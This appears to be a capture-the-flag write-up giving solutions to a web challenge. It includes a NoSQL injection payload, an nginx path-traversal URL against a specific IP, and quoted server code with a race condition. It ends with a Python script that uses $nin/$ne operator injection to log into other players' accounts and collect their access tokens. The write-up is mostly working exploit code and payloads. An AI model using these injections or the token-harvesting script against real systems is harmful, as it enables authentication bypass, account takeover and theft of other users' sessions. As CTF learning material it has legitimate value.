## Solution.

### NoSQLi

```json
{"division_number": {"$regex": ".*"}
```

### Nginx Misconf

```
http://3.35.40.133/api/static../index.js
```

### Race Condition

```js
const auth = (req, res) => {
    User
        .findOne({
            userid: req.userid
        })
        .then(user => {
            if (user.level != 0) {
                throw new Error();
            } else {
                Division.findOne({division_number: req.body.division_number})
                    .then(div => {
                        if (div && user.level === 0) {
                            User
                                .updateOne({
                                    userid: req.userid
                                }, {'$inc': {level: 1}})
                                .then(_ => {})
                                .catch(_ => {});
                        }
                    })
                    .catch(e => {});
                res.status(200);
                res.send();
            }
        })
        .then(_ => {
            User
                .findOne({
                    userid: req.userid
                })
        })
        .catch(e => {
            res.status(500);
            res.send();
        });
}
```


## Unintended Solution ?

challenge admin(or Operator) didn't remove(clean) databases.
So player may leak another player's account.

```py
import requests
import base64
import binascii

findid = {}

def go():
    data = {"$nin": list(findid.keys())}
    r = requests.post("http://3.35.40.133/api/signin", json={'userid': data, "password": {"$ne": "b"}})
    token = r.json()['token']
    newuser = r.json()['username']
    cr = check(newuser, token)
    findid.update({newuser: token})

def check(username, token):
    headers = {"x-access-token": token}
    r2 =requests.get("http://3.35.40.133/api/get_info", headers=headers)
    if r2.json()['perm'] != "Guest":
        print("no guest: ", username, r2.json()['perm'], token)
        findid.update({username: token})
        print(findid)


for i in range(100):
    go()
```
